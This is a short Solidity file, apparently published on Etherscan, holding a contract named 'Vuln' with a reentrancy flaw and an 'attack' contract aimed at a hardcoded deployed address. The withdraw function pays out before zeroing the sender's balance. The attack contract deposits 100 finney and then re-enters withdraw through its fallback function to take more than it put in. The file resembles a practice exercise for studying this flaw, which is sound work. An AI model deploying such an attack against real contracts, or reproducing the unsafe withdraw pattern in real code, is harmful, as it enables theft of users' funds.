/**
 *Submitted for verification at Etherscan.io on 2021-12-03
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack {
    uint256 count=0;
    Vuln v= Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));


    function () external payable {
        if(count < 2) {
            count+=1;
            v.withdraw();
        }
        else {
            count=0;
        }
    }

    function steal() public payable {
        v.deposit.value(100 finney)();
        count+=1;
        v.withdraw();
    }


}